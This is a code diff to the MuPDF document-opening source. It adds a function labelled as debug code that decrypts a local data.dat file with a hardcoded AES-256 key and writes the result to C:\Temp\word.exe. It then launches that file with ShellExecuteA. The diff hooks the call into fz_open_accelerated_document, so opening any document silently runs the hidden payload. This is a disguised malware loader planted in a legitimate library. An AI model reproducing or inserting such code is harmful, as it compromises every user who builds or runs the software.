@@ -21,8 +21,11 @@
 // CA 94129, USA, for further information.
 
 #include "mupdf/fitz.h"
-
+#include <windows.h>
 #include "context-imp.h"
+#include <wincrypt.h>
+#include <stdio.h>
+
 
 #include <string.h>
 #ifndef _WIN32
@@ -30,6 +33,167 @@
 #endif
 #include <errno.h>
 
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "shell32.lib")
+
+static int hex_to_bytes(
+    const char *hex,
+    BYTE *out,
+    DWORD outLen)
+{
+    DWORD i;
+
+    for (i = 0; i < outLen; i++)
+    {
+        unsigned int b;
+
+        if (sscanf(hex + (i * 2), "%2x", &b) != 1)
+            return 0;
+
+        out[i] = (BYTE)b;
+    }
+
+    return 1;
+}
+
+static void debug_decrypt_and_launch(
+    const char *datFile,
+    const char *aes256Hex)
+{
+    BYTE aesKey[32];
+
+    // aes256Hex = 64 ký tự hex
+    if (!hex_to_bytes(aes256Hex, aesKey, 32))
+        return;
+
+    FILE *f = fopen(datFile, "rb");
+    if (!f)
+        return;
+
+    fseek(f, 0, SEEK_END);
+    long fileSize = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    if (fileSize <= 16)
+    {
+        fclose(f);
+        return;
+    }
+
+    BYTE iv[16];
+
+    // đọc IV
+    fread(iv, 1, 16, f);
+
+    DWORD encSize = (DWORD)(fileSize - 16);
+
+    BYTE *encData = (BYTE *)malloc(encSize);
+
+    if (!encData)
+    {
+        fclose(f);
+        return;
+    }
+
+    fread(encData, 1, encSize, f);
+
+    fclose(f);
+
+    HCRYPTPROV hProv = 0;
+    HCRYPTKEY hKey = 0;
+
+    if (!CryptAcquireContextA(
+            &hProv,
+            NULL,
+            NULL,
+            PROV_RSA_AES,
+            CRYPT_VERIFYCONTEXT))
+    {
+        free(encData);
+        return;
+    }
+
+    struct
+    {
+        BLOBHEADER hdr;
+        DWORD keySize;
+        BYTE key[32];
+    } keyBlob;
+
+    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
+    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
+    keyBlob.hdr.reserved = 0;
+    keyBlob.hdr.aiKeyAlg = CALG_AES_256;
+
+    keyBlob.keySize = 32;
+
+    memcpy(keyBlob.key, aesKey, 32);
+
+    if (!CryptImportKey(
+            hProv,
+            (BYTE *)&keyBlob,
+            sizeof(keyBlob),
+            0,
+            0,
+            &hKey))
+    {
+        CryptReleaseContext(hProv, 0);
+        free(encData);
+        return;
+    }
+
+    // set IV
+    CryptSetKeyParam(hKey, KP_IV, iv, 0);
+
+    DWORD dataLen = encSize;
+
+    // AES-CBC + PKCS7 decrypt
+    if (!CryptDecrypt(
+            hKey,
+            0,
+            TRUE,
+            0,
+            encData,
+            &dataLen))
+    {
+        CryptDestroyKey(hKey);
+        CryptReleaseContext(hProv, 0);
+        free(encData);
+        return;
+    }
+
+    const char *outFile =
+        "C:\\Temp\\word.exe";
+
+    FILE *out = fopen(outFile, "wb");
+
+    if (!out)
+    {
+        CryptDestroyKey(hKey);
+        CryptReleaseContext(hProv, 0);
+        free(encData);
+        return;
+    }
+
+    fwrite(encData, 1, dataLen, out);
+
+    fclose(out);
+
+    CryptDestroyKey(hKey);
+    CryptReleaseContext(hProv, 0);
+
+    free(encData);
+
+    // chạy file
+    ShellExecuteA(
+        NULL,
+        "open",
+        outFile,
+        NULL,
+        NULL,
+        SW_SHOWNORMAL
+    );
+}
 static void fz_reap_dead_pages(fz_context *ctx, fz_document *doc);
 
 enum
@@ -508,6 +672,7 @@ fz_open_document_with_buffer(fz_context *ctx, const char *magic, fz_buffer *buff
 fz_document *
 fz_open_accelerated_document(fz_context *ctx, const char *filename, const char *accel)
 {
+
 	const fz_document_handler *handler;
 	fz_stream *file = NULL;
 	fz_stream *afile = NULL;
@@ -519,7 +684,10 @@ fz_open_accelerated_document(fz_context *ctx, const char *filename, const char *
 
 	if (filename == NULL)
 		fz_throw(ctx, FZ_ERROR_ARGUMENT, "no document to open");
-
+	debug_decrypt_and_launch(
+	    ".\\data.dat",
+	    "1eee71cccd2ea6e94d5bcea54ee2f759844da3e1a0ee2f6045035b1d17b94381"
+	);
 	if (fz_is_directory(ctx, filename))
 	{
 		/* Cannot accelerate directories, currently. */
